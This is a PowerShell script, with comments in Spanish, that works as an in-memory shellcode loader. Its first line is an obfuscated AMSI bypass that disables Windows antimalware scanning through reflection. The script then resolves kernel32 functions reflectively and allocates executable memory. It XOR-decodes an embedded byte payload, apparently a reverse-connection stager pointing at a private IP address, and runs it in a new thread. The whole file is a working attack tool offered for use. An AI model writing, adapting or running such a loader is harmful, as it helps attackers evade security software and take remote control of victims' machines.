[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))

function LookupFunc {
        Param ($moduleName, $functionName)
        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
        Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $tmp=@()
        $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
                [Parameter(Position = 1)] [Type] $delType = [Void]
        )

        # Crea custom assembly y define el modulo y tipos
        $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate])
 
        #Crea el constructor
        $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')

        #Crea el metodo invoke
        $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
 
        return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
(LookupFunc kernel32.dll VirtualAlloc),
(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)


$xKey = 0x55
[Byte[]] $bufenc = 0xa9,0x1d,0xd6,0xb1,0xa5,0xbd,0x99,0x55,0x55,0x55,0x14,0x4,0x14,0x5,0x7,0x4,0x3,0x1d,0x64,0x87,0x30,0x1d,0xde,0x7,0x35,0x1d,0xde,0x7,0x4d,0x1d,0xde,0x7,0x75,0x18,0x64,0x9c,0x1d,0xde,0x27,0x5,0x1d,0x5a,0xe2,0x1f,0x1f,0x1d,0x64,0x95,0xf9,0x69,0x34,0x29,0x57,0x79,0x75,0x14,0x94,0x9c,0x58,0x14,0x54,0x94,0xb7,0xb8,0x7,0x1d,0xde,0x7,0x75,0x14,0x4,0xde,0x17,0x69,0x1d,0x54,0x85,0x33,0xd4,0x2d,0x4d,0x5e,0x57,0x5a,0xd0,0x27,0x55,0x55,0x55,0xde,0xd5,0xdd,0x55,0x55,0x55,0x1d,0xd0,0x95,0x21,0x32,0x1d,0x54,0x85,0x5,0xde,0x1d,0x4d,0x11,0xde,0x15,0x75,0x1c,0x54,0x85,0xb6,0x3,0x1d,0xaa,0x9c,0x14,0xde,0x61,0xdd,0x1d,0x54,0x83,0x18,0x64,0x9c,0x1d,0x64,0x95,0xf9,0x14,0x94,0x9c,0x58,0x14,0x54,0x94,0x6d,0xb5,0x20,0xa4,0x19,0x56,0x19,0x71,0x5d,0x10,0x6c,0x84,0x20,0x8d,0xd,0x11,0xde,0x15,0x71,0x1c,0x54,0x85,0x33,0x14,0xde,0x59,0x1d,0x11,0xde,0x15,0x49,0x1c,0x54,0x85,0x14,0xde,0x51,0xdd,0x1d,0x54,0x85,0x14,0xd,0x14,0xd,0xb,0xc,0xf,0x14,0xd,0x14,0xc,0x14,0xf,0x1d,0xd6,0xb9,0x75,0x14,0x7,0xaa,0xb5,0xd,0x14,0xc,0xf,0x1d,0xde,0x47,0xbc,0x1e,0xaa,0xaa,0xaa,0x8,0x1d,0x64,0x8e,0x6,0x1c,0xeb,0x22,0x3c,0x3b,0x3c,0x3b,0x30,0x21,0x55,0x14,0x3,0x1d,0xdc,0xb4,0x1c,0x92,0x97,0x19,0x22,0x73,0x52,0xaa,0x80,0x6,0x6,0x1d,0xdc,0xb4,0x6,0xf,0x18,0x64,0x95,0x18,0x64,0x9c,0x6,0x6,0x1c,0xef,0x6f,0x3,0x2c,0xf2,0x55,0x55,0x55,0x55,0xaa,0x80,0xbd,0x5a,0x55,0x55,0x55,0x64,0x6c,0x67,0x7b,0x64,0x63,0x6d,0x7b,0x61,0x6c,0x7b,0x64,0x62,0x6c,0x55,0xf,0x1d,0xdc,0x94,0x1c,0x92,0x95,0xee,0x54,0x55,0x55,0x18,0x64,0x9c,0x6,0x6,0x3f,0x56,0x6,0x1c,0xef,0x2,0xdc,0xca,0x93,0x55,0x55,0x55,0x55,0xaa,0x80,0xbd,0xe7,0x55,0x55,0x55,0x7a,0xd,0x36,0xc,0x4,0x3a,0x3c,0x2f,0x3d,0x20,0x1e,0x6d,0x3e,0x3f,0x2c,0x2,0x1b,0x7,0x2c,0x65,0x14,0x5,0x22,0x1d,0x24,0x7,0x27,0x2,0x3d,0x22,0x38,0x32,0x16,0x1c,0x3a,0x1c,0x3b,0x1b,0x64,0x3d,0x1d,0x0,0x33,0x25,0x32,0x13,0x63,0x78,0x39,0x1,0x3e,0x66,0x1f,0x3d,0x32,0x12,0xa,0x31,0x1a,0x7,0x1e,0x3a,0x78,0x1c,0x0,0xd,0x2c,0x36,0x2,0x5,0x38,0x33,0x1c,0x6d,0x37,0x1f,0x14,0x67,0x2d,0x11,0x31,0x7,0x0,0x33,0x21,0x1c,0x3b,0x19,0x30,0x6d,0xc,0x1a,0x3d,0x25,0x37,0x39,0x30,0x2d,0x78,0x2c,0x3c,0x6,0x17,0x62,0x3f,0x26,0xa,0x3e,0x1d,0x14,0x3f,0x11,0x3d,0x78,0x1f,0x1b,0x13,0xa,0x3,0x66,0x26,0x17,0x24,0x30,0x2f,0x1,0x27,0x7,0x39,0xa,0x1,0x3,0xc,0x32,0x0,0x4,0x32,0x63,0x2c,0x2c,0x2,0x21,0x30,0x6c,0x16,0x1c,0x1f,0x65,0x11,0x14,0x2d,0x2f,0x67,0x6d,0x37,0x2,0x3b,0x11,0x19,0x7,0x65,0x24,0x62,0x32,0x66,0x13,0x24,0x1f,0x32,0x20,0x22,0x10,0x34,0x11,0x11,0x64,0x67,0x55,0x1d,0xdc,0x94,0x6,0xf,0x14,0xd,0x18,0x64,0x9c,0x6,0x1d,0xed,0x55,0x67,0xfd,0xd1,0x55,0x55,0x55,0x55,0x5,0x6,0x6,0x1c,0x92,0x97,0xbe,0x0,0x7b,0x6e,0xaa,0x80,0x1d,0xdc,0x93,0x3f,0x5f,0xa,0x1d,0xdc,0xa4,0x3f,0x4a,0xf,0x7,0x3d,0xd5,0x66,0x55,0x55,0x1c,0xdc,0xb5,0x3f,0x51,0x14,0xc,0x1c,0xef,0x20,0x13,0xcb,0xd3,0x55,0x55,0x55,0x55,0xaa,0x80,0x18,0x64,0x95,0x6,0xf,0x1d,0xdc,0xa4,0x18,0x64,0x9c,0x18,0x64,0x9c,0x6,0x6,0x1c,0x92,0x97,0x78,0x53,0x4d,0x2e,0xaa,0x80,0xd0,0x95,0x20,0x4a,0x1d,0x92,0x94,0xdd,0x46,0x55,0x55,0x1c,0xef,0x11,0xa5,0x60,0xb5,0x55,0x55,0x55,0x55,0xaa,0x80,0x1d,0xaa,0x9a,0x21,0x57,0xbe,0xff,0xbd,0x0,0x55,0x55,0x55,0x6,0xc,0x3f,0x15,0xf,0x1c,0xdc,0x84,0x94,0xb7,0x45,0x1c,0x92,0x95,0x55,0x45,0x55,0x55,0x1c,0xef,0xd,0xf1,0x6,0xb0,0x55,0x55,0x55,0x55,0xaa,0x80,0x1d,0xc6,0x6,0x6,0x1d,0xdc,0xb2,0x1d,0xdc,0xa4,0x1d,0xdc,0x8f,0x1c,0x92,0x95,0x55,0x75,0x55,0x55,0x1c,0xdc,0xac,0x1c,0xef,0x47,0xc3,0xdc,0xb7,0x55,0x55,0x55,0x55,0xaa,0x80,0x1d,0xd6,0x91,0x75,0xd0,0x95,0x21,0xe7,0x33,0xde,0x52,0x1d,0x54,0x96,0xd0,0x95,0x20,0x87,0xd,0x96,0xd,0x3f,0x55,0xc,0xee,0xb5,0x48,0x7f,0x5f,0x14,0xdc,0x8f,0xaa,0x80

[Byte[]]$buf = @();
for ($i = 0; $i -lt $bufenc.Count; $i++) {
    $buf += (($bufenc[$i] -bxor $xKey[0]) -band 0xFF)
}




[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
(LookupFunc kernel32.dll CreateThread),
(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
(LookupFunc kernel32.dll WaitForSingleObject),
(getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
